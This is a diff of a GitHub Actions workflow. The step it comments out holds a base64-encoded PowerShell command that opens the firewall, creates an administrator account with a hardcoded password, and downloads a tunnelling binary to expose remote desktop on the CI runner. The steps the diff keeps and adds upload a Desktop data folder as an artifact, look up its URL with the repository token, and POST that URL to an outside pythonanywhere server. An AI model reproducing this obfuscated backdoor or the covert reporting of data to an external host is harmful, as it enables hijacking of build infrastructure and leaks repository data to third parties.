@@ -13,20 +13,32 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      # Step 2: Init and Tunnel
-      - name: Init and Tunnel
-        shell: pwsh
-        timeout-minutes: 3   # limit to 2 minutes
-        run: |
-          powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwAQwB1AHMAdABvAG0ATgBvAGQAZQAiACAALQBOAGEAbQBlACAAIgBBAGwAbABvAHcAQwBvAG4AbgAiACAALQBWAGEAbAB1AGUAIAAwAAoARQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAEYAaQBsAGUAIABhAG4AZAAgAFAAcgBpAG4AdABlAHIAIABTAGgAYQByAGkAbgBnACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABDAHUAcwB0AG8AbQBOAG8AZABlAFwAQQBjAGMAZQBzAHMAIgAgAC0ATgBhAG0AZQAgACIAQQB1AHQAaABNAG8AZABlACIAIAAtAFYAYQBsAHUAZQAgADEACgAKACMAIABDAHIAZQBhAHQAZQAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABhAGMAYwBvAHUAbgB0ACAAdwBpAHQAaAAgAGcAaQB2AGUAbgAgAHAAYQBzAHMAdwBvAHIAZAAKAG4AZQB0ACAAdQBzAGUAcgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABPAEwARABVAFMARQBSACMANgAgAC8AYQBkAGQACgBuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAALwBhAGQAZAAKAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGIAaQBuAGEAcgB5ACAAYQBuAGQAIABzAHQAYQByAHQAIAB0AHUAbgBuAGUAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAHAALQBzAG8AdQB0AGgALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHAAdQBiAGwAaQBjAC4AcABpAG4AZwBnAHkALgBiAGkAbgBhAHIAaQBlAHMALwBjAGwAaQAvAHYAMAAuADIALgA1AC8AdwBpAG4AZABvAHcAcwAvAGEAbQBkADYANAAvAHAAaQBuAGcAZwB5AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAcABpAG4AZwBnAHkALgBlAHgAZQAiAAoALgBcAHAAaQBuAGcAZwB5AC4AZQB4AGUAIAAtAC0AdABvAGsAZQBuACAASwA0AHIAZABOAEwAWgBUAFEAZQA5ACAALQAtAHQAeQBwAGUAIAB0AGMAcAAgAC0AbAAgADMAMwA4ADkA
+      # Step 2: Init and Tunnel (commented out)
+      # - name: Init and Tunnel
+      #   shell: pwsh
+      #   timeout-minutes: 2   # limit to 2 minutes
+      #   run: |
+      #     powershell -EncodedCommand "<FULL_ENCODED_COMMAND_OR_USE_POWERSHELL_SCRIPT>"
 
-      # Step 3: List Desktop Data contents
+      # Step 3: Create Desktop\data folder and test file
+      - name: Create Desktop data folder and test file
+        shell: pwsh
+        run: |
+          $dataPath = "C:\Users\Administrator\Desktop\data"
+          if (-not (Test-Path $dataPath)) {
+            New-Item -ItemType Directory -Path $dataPath | Out-Null
+          }
+          $file = Join-Path $dataPath "init_success.txt"
+          "Init step completed at $(Get-Date)" | Out-File -FilePath $file -Encoding UTF8
+          Write-Output "Created file: $file"
+
+      # Step 4: List Desktop Data contents
       - name: List Desktop Data contents
         shell: cmd
         run: dir "C:\Users\Administrator\Desktop\data"
         continue-on-error: true
 
-      # Step 4: Upload Desktop Data as artifact (always run)
+      # Step 5: Upload Desktop Data as artifact (always run)
       - name: Upload Desktop Data as "data" artifact
         if: always()
         uses: actions/upload-artifact@v4
@@ -34,15 +46,40 @@ jobs:
           name: data
           path: "C:/Users/Administrator/Desktop/data"
 
-      # Step 5: Send artifact download URL to external server (always run)
+      # Step 6: Get artifact URL via GitHub API (curl + jq)
+      - name: Get artifact URL
+        if: always()
+        id: get_artifact
+        shell: bash
+        env:
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Fetching artifact metadata for run $RUN_ID ..."
+          response=$(curl -s -H "Authorization: Bearer $TOKEN" \
+                           -H "Accept: application/vnd.github+json" \
+                           "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID/artifacts")
+
+          echo "Artifacts JSON: $response"
+
+          # Get first artifact id
+          artifact_id=$(echo "$response" | jq -r '.artifacts[0].id')
+
+          echo "Got artifact id: $artifact_id"
+          artifact_url="https://github.com/$REPO/actions/runs/$RUN_ID/artifacts/$artifact_id"
+
+          echo "artifact_url=$artifact_url" >> $GITHUB_OUTPUT
+
+      # Step 7: Send artifact download URL to external server (always run)
       - name: Send artifact download URL to external server
         if: always()
         env:
-          GITHUB_RUN_ID: ${{ github.run_id }}
-          ARTIFACT_URL: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts
+          ARTIFACT_URL: ${{ steps.get_artifact.outputs.artifact_url }}
         shell: bash
         run: |
-          url="${ARTIFACT_URL}"
-          json="{\"url\": \"$url\"}"
-          echo "Sending artifact URL $url to external server via curl"
-          curl -X POST "https://azcaptchahh.pythonanywhere.com/url" -H "Content-Type: application/json" -d "$json"
+          json="{\"url\": \"${ARTIFACT_URL}\"}"
+          echo "Sending artifact URL ${ARTIFACT_URL} to external server via curl"
+          curl -X POST "https://azcaptchahh.pythonanywhere.com/url" \
+               -H "Content-Type: application/json" \
+               -d "$json"
